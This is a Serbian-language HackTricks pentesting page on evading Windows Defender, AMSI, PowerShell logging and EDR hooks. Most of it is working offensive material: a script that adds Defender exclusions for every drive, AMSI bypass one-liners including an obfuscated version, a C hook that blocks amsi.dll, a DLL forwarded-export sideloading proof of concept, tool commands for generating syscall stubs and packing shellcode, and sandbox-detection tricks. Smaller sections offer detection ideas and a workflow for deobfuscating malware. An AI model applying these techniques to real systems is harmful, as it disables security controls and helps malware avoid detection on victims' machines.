# Zaobilaženje antivirusne zaštite (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a lažnim predstavljanjem drugog AV-a.
- [Onemogućite Defender ako ste admin](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalera pre manipulisanja Defender-om

Javno dostupni loader-i koji se predstavljaju kao game cheat-ovi često se isporučuju kao nepotpisani Node.js/Nexe instaleri koji najpre **traže od korisnika povišene privilegije**, a tek zatim onesposobljavaju Defender. Tok je jednostavan:

1. Proverava da li postoji administratorski kontekst pomoću `net session`. Komanda uspeva samo kada caller ima admin privilegije, pa neuspeh ukazuje na to da se loader izvršava kao standardni korisnik.
2. Odmah ponovo pokreće samog sebe pomoću glagola `RunAs` kako bi pokrenuo očekivani UAC prompt za pristanak, uz očuvanje originalne komandne linije.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju „cracked“ softver, pa se upit obično prihvata, čime malware dobija prava potrebna za izmene Defender politike.<sup>[[26]](#references)</sup>

### Sveobuhvatna `MpPreference` izuzimanja za svako slovo diska

Nakon elevacije privilegija, lanci u stilu GachiLoader-a maksimalno koriste Defender slepe tačke umesto da potpuno onemoguće servis. Loader najpre prekida GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim postavlja **izuzetno široka izuzimanja**, tako da svaki korisnički profil, sistemski direktorijum i prenosivi disk postaju nedostupni za skeniranje:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ključna zapažanja:

- Petlja prolazi kroz svaki montirani filesystem (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload sačuvan bilo gde na disku ignoriše**.
- Isključenje ekstenzije `.sys` je predviđeno unapred — napadači zadržavaju mogućnost da kasnije učitaju unsigned drivers bez ponovnog menjanja Defendera.
- Sve izmene se upisuju u `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su exclusions i dalje prisutni ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedan Defender servis nije zaustavljen, naivne health provere i dalje prijavljuju „antivirus aktivan“, iako real-time inspection nikada ne dodiruje te putanje.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Trenutno AV-ovi koriste različite metode za proveru da li je fajl malicious ili ne: static detection, dynamic analysis, a kod naprednijih EDR-ova i behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih malicious stringova ili nizova bajtova u binary ili script fajlu, kao i izvlačenjem informacija iz samog fajla (npr. opis fajla, naziv kompanije, digital signatures, ikona, checksum itd.). To znači da korišćenje poznatih javno dostupnih alata može lakše dovesti do detekcije, jer su oni verovatno već analizirani i označeni kao malicious. Postoji nekoliko načina da se ovakva detekcija zaobiđe:

- **Encryption**

Ako encryptujete binary, AV neće moći da detektuje vaš program, ali će vam biti potreban neki loader za decryption i pokretanje programa u memoriji.

- **Obfuscation**

Ponekad je dovoljno samo da promenite neke stringove u binary ili script fajlu kako bi prošao AV, ali to može biti vremenski zahtevan zadatak, u zavisnosti od toga šta pokušavate da obfuscate.

- **Custom tooling**

Ako razvijete sopstvene alate, neće postojati poznate bad signatures, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru Windows Defender static detection jeste [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u osnovi deli fajl na više segmenata, a zatim zadaje Defenderu da svaki od njih skenira pojedinačno. Na taj način može tačno da vam pokaže koji stringovi ili bajtovi u vašem binary fajlu su označeni.

Toplo preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### **Dynamic analysis**

Dynamic analysis podrazumeva da AV pokrene vaš binary u sandboxu i prati malicious aktivnosti (npr. pokušaj decryption-a i čitanja passworda iz browsera, izvršavanje minidump-a nad LSASS-om itd.). Sa ovim delom može biti malo teže raditi, ali evo nekoliko stvari koje možete uraditi za izbegavanje sandboxova.

- **Sleep pre execution-a** U zavisnosti od implementacije, ovo može biti odličan način za zaobilaženje AV dynamic analysis-a. AV-ovi imaju veoma malo vremena za skeniranje fajlova kako ne bi prekinuli workflow korisnika, pa dugi sleep-ovi mogu omesti analysis binary fajlova. Problem je u tome što mnogi AV sandboxovi mogu jednostavno preskočiti sleep, u zavisnosti od načina implementacije.
- **Provera resursa mašine** Sandboxovi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore mašinu korisnika. Ovde možete biti i veoma kreativni, na primer proverom temperature CPU-a ili čak brzine ventilatora — neće sve biti implementirano u sandboxu.
- **Machine-specific provere** Ako želite da ciljate korisnika čija je workstation pridružena domenu „contoso.local“, možete proveriti domen računara i videti da li se podudara sa onim koji ste naveli. Ako se ne podudara, možete učiniti da vaš program izađe.

Ispostavlja se da je computername Microsoft Defender Sandbox-a HAL9TH, pa možete proveriti naziv računara u svom malware-u pre detonacije. Ako se naziv podudara sa HAL9TH, to znači da ste unutar Defender sandboxa, pa možete učiniti da vaš program izađe.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za suprotstavljanje sandboxovima

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **public tools** će vremenom biti **detektovani**, pa bi trebalo da se zapitate:

Na primer, ako želite da uradite dump LSASS-a, **da li zaista morate da koristite mimikatz**? Ili biste mogli da koristite neki drugi, manje poznat projekat koji takođe radi dump LSASS-a?

Drugi odgovor je verovatno pravi. Ako uzmemo mimikatz za primer, on je verovatno jedan od, ako ne i najviše označenih malware-a od strane AV-ova i EDR-ova. Iako je sam projekat veoma dobar, rad sa njim radi zaobilaženja AV-ova predstavlja pravu noćnu moru, pa jednostavno potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate svoje payload-e radi evasion-a, obavezno **isključite automatic sample submission** u Defenderu i, ozbiljno, **NEMOJTE UPLOADOVATI NA VIRUSTOTAL** ako vam je cilj dugoročno postizanje evasion-a. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatic sample submission i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **dajte prednost korišćenju DLL-ova za evasion**, jer su po mom iskustvu DLL fajlovi obično **mnogo ređe detektovani** i analizirani. Zbog toga je ovo veoma jednostavan trik za izbegavanje detekcije u nekim slučajevima (naravno, ako vaš payload može da se pokrene kao DLL).

Kao što možemo videti na ovoj slici, DLL Payload iz Havoc-a ima detection rate od 4/26 na antiscan.me, dok EXE payload ima detection rate od 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a i normalnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo pokazati nekoliko trikova koje možete koristiti sa DLL fajlovima kako biste bili mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi prednost DLL search order-a koji loader primenjuje tako što postavlja victim application i malicious payload(e) jedan pored drugog.

Programe koji su podložni DLL Sideloading-u možete proveriti pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledećeg powershell script-a:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijacking-u unutar direktorijuma "C:\Program Files\\" i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da sami **istražite DLL Hijackable/Sideloadable programe**, ova tehnika je, kada se pravilno izvede, prilično stealthy, ali ako koristite javno poznate DLL Sideloadable programe, možete biti lako otkriveni.

Samo postavljanje malicious DLL-a sa imenom koje program očekuje da učita neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku pod nazivom **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i malicious) DLL-a ka originalnom DLL-u, čime se očuvava funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni DLL sa promenjenim imenom.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), kako biste saznali više o onome o čemu smo detaljnije govorili.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE moduli mogu da eksportuju funkcije koje su zapravo "forwarders": umesto pokazivanja na kod, export unos sadrži ASCII string u obliku `TargetDll.TargetFunc`. Kada caller razrešava export, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, dobavlja se iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji uključuje direktorijum modula koji obavlja forward resolution.

Ovo omogućava indirektni sideloading primitive: pronađite potpisani DLL koji eksportuje funkciju prosleđenu ka nazivu modula koji nije KnownDLL, a zatim smestite taj potpisani DLL zajedno sa DLL-om kojim upravlja attacker i koji ima potpuno isto ime kao prosleđeni ciljni modul. Kada se pozove forwarded export, loader razrešava forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se pronalazi prema uobičajenom redosledu pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u folder sa dozvolom upisivanja
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Ubacite zlonamerni `NCRYPTPROV.dll` u istu fasciklu. Minimalni DllMain je dovoljan za izvršavanje koda; nije potrebno implementirati prosleđenu funkciju da bi se pokrenuo DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktivirajte prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Uočeno ponašanje:
- `rundll32` (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku „missing API“ tek nakon što je `DllMain` već izvršen

Saveti za hunting:
- Fokusirajte se na forwarded exports kod kojih ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Forwarded exports možete enumerisati pomoću tooling-a kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwarder-a da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadzirite LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz putanja koje nisu sistemske, a zatim iz tog direktorijuma učitavaju non-KnownDLLs sa istim osnovnim imenom
- Upozoravajte na lance procesa/modula kao što je: `rundll32.exe` → `keyiso.dll` izvan sistemskih putanja → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Primenite politike integriteta koda (WDAC/AppLocker) i zabranite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze možete koristiti za učitavanje i izvršavanje vašeg shellcode-a na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša; ono što funkcioniše danas sutra može biti detektovano, zato se nikada ne oslanjajte na samo jedan alat i, ako je moguće, pokušajte da kombinujete više evasion tehnika.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na syscall stubove u `ntdll.dll`. Da biste zaobišli te hooks, možete generisati **direct** ili **indirect** syscall stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hookovanog export entrypoint-a.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: ubacuje `syscall`/`sysenter`/`SVC #0` instrukciju u generisani stub (bez pristupanja `ntdll` export-u).
- **Indirect**: skače u postojeći `syscall` gadget unutar `ntdll`, tako da izgleda kao da kernel transition potiče iz `ntdll` (korisno za heurističku evasion); **randomized indirect** bira gadget iz pool-a pri svakom pozivu.
- **Egg-hunt**: izbegava ugrađivanje statičkog `0F 05` opcode niza na disku; syscall sekvenca se pronalazi tokom runtime-a.

**Hook-resistant SSN resolution strategije:**
- **FreshyCalls (VA sort)**: određuje SSN-ove sortiranjem syscall stubova prema virtualnoj adresi, umesto čitanjem bajtova stub-a.
- **SyscallsFromDisk**: mapira čistu `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog `.text` odeljka, a zatim vrši unmap (zaobilazi sve in-memory hooks).
- **RecycledGate**: kombinuje VA-sorted SSN inference sa validacijom opcode-a kada je stub čist; ako je hookovan, vraća se na VA inference.
- **HW Breakpoint**: postavlja DR0 na `syscall` instrukciju i koristi VEH za hvatanje SSN-a iz `EAX` tokom runtime-a, bez parsiranja hookovanih bajtova.

Primer korišćenja SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AV-ovi su mogli da skeniraju samo **fajlove na disku**, pa ako biste nekako uspeli da izvršite payload **direktno u memoriji**, AV nije mogao ništa da uradi kako bi to sprečio, jer nije imao dovoljnu vidljivost.

AMSI funkcija je integrisana u sledeće Windows komponente.

- User Account Control, ili UAC (elevacija EXE, COM, MSI ili ActiveX instalacije)
- PowerShell (skripte, interaktivna upotreba i dinamička evaluacija koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Ona antivirusnim rešenjima omogućava da pregledaju ponašanje skripti tako što sadržaj skripti izlaže u formi koja je i dešifrovana i deofuskovana.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` proizvešće sledeće upozorenje u Windows Defenderu.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje `amsi:`, a zatim putanju do izvršnog fajla iz kog je skripta pokrenuta, u ovom slučaju powershell.exe

Nismo spustili nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Štaviše, počev od **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za učitavanje izvršavanja u memoriji. Zato se za izvršavanje u memoriji preporučuje korišćenje nižih verzija .NET-a (kao što je 4.7.2 ili niže) ako želite da zaobiđete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa statičkim detekcijama, izmena skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost da deofuskuje skripte čak i ako imaju više slojeva, pa obfuscation može biti loša opcija u zavisnosti od načina na koji je urađen. Zbog toga njegovo zaobilaženje nije baš jednostavno. Ipak, ponekad je dovoljno samo da promenite nekoliko imena promenljivih i bićete uspešni, pa to zavisi od toga koliko je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u powershell (kao i cscript.exe, wscript.exe itd.) proces, moguće je lako manipulisati njime čak i kada se izvršava kao neprivilegovani korisnik. Zbog ovog propusta u implementaciji AMSI-ja, istraživači su pronašli više načina za izbegavanje AMSI skeniranja.

**Forcing an Error**

Prisiljavanje AMSI inicijalizacije da ne uspe (`amsiInitFailed`) dovešće do toga da se za trenutni proces ne pokrene nijedno skeniranje. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio signature kako bi sprečio širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Za onesposobljavanje AMSI-ja za trenutni powershell proces bila je dovoljna samo jedna linija powershell koda. AMSI je, naravno, sam označio ovu liniju, pa su potrebne određene izmene da bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass koda koji sam preuzeo iz ovog [Github Gist-a](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti flagged čim ova objava bude objavljena, zato ne bi trebalo da objavljujete nikakav code ako je vaš plan da ostanete undetected.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/), a podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje inputa koji je uneo korisnik) i njeno prepisivanje instrukcijama koje vraćaju code za E_INVALIDARG. Na ovaj način rezultat stvarnog skeniranja biće 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za bypass AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan, jezički nezavisan bypass jeste postavljanje user-mode hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je zahtevani modul `amsi.dll`. Kao rezultat toga, AMSI se nikada ne učitava i za taj proces se ne obavljaju skeniranja.<sup>[[23]](#references)</sup>

Pregled implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Radi u PowerShell, WScript/CScript i custom loader-ima (sa bilo čim što bi inače učitalo AMSI).
- Kombinujte sa prosleđivanjem script-a preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli duge artefakte komandne linije.
- Primećeno je da se koristi sa loader-ima izvršenim kroz LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše script za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše script za zaobilaženje AMSI-ja koji izbegava signature korišćenjem randomizovane funkcije koju definiše korisnik, promenljivih, izraza sa karakterima i nasumičnim menjanjem veličine slova u PowerShell ključnim rečima radi izbegavanja signature.

**Uklonite detektovani signature**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** za uklanjanje detektovanog AMSI signature-a iz memorije trenutnog procesa. Ovaj alat funkcioniše tako što skenira memoriju trenutnog procesa u potrazi za AMSI signature-om, a zatim ga prepisuje NOP instrukcijama, čime ga efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite Powershell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati svoje script-ove bez AMSI skeniranja. To možete uraditi ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno u svrhe revizije i rešavanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Ako koristite PowerShell version 2, AMSI se neće učitati, pa možete izvršavati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da hostujete PowerShell bez pokretanja `powershell.exe` (pristup koji koristi `powerpick` u Cobalt Strike-u). Ovo zaobilazi kontrole posebno vezane za proces `powershell.exe`, ali samo po sebi ne onemogućava AMSI, Script Block Logging niti svaku drugu PowerShell zaštitu; pokrivenost zavisi od runtime-a i implementacije hosta.


## Obfuskacija

> [!TIP]
> Nekoliko tehnika obfuskacije oslanja se na enkripciju podataka, što će povećati entropiju binarne datoteke i olakšati AV-ovima i EDR-ovima njenu detekciju. Budite pažljivi i možda primenite enkripciju samo na određene delove koda koji su osetljivi ili moraju biti skriveni.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), uobičajeno je suočiti se sa više slojeva zaštite koji će blokirati dekompilatore i sandbox okruženja. Tok rada u nastavku pouzdano **vraća IL gotovo u originalno stanje**, nakon čega se može dekompilirati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1. Uklanjanje zaštite od neovlašćenih izmena – ConfuserEx enkriptuje svako *method body* i dekriptuje ga unutar statičkog konstruktora (`<Module>.cctor`) *module*-a. Takođe menja PE checksum, pa će svaka izmena izazvati rušenje binarne datoteke. Koristite **AntiTamperKiller** da pronađete enkriptovane metadata tabele, povratite XOR ključeve i ponovo upišete čistu assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2. Oporavak simbola i control-flow-a – prosledite *clean* datoteku alatu **de4dot-cex** (fork-u de4dot-a koji podržava ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:  
• `-p crx` – bira ConfuserEx 2 profil  
• de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i nazive promenljivih i dekriptovati konstantne stringove.

3. Uklanjanje proxy poziva – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (tzv. *proxy calls*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalan .NET API, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprovidnih wrapper funkcija (`Class8.smethod_10`, …).

4. Ručno čišćenje – pokrenite dobijenu binarnu datoteku u dnSpy-u, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload. Malware ga često čuva kao TLV-enkodirani niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Navedeni lanac obnavlja tok izvršavanja **bez potrebe za pokretanjem zlonamernog uzorka** – korisno pri radu na offline workstation-u.

> 🛈  ConfuserEx generiše prilagođeni atribut pod nazivom `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijska komanda
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) compilation suite-a koji omogućava povećanu softversku bezbednost kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštitu od neovlašćenih izmena.
